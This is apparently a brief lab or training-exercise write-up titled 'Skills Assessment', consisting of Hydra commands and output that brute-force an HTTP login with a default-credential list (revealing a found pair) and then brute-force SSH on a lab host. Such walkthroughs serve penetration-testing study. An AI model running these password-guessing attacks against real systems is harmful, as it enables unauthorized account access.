# Skills Assessment

```
┌──(kali㉿ProLabs)-[~]
└─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.253.102 -s 30565 -u -f -I http-get / 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-28 16:30:55
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://83.136.253.102:30565/
[30565][http-get] host: 83.136.253.102   login: user   password: password
[STATUS] attack finished for 83.136.253.102 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-28 16:30:55

```

```
ssh harry.potter@94.237.62.149 -p 44335
```

```
hydra -L user_harry.txt -P harry.txt -u -f ssh://94.237.62.149:44335 -t 4
```
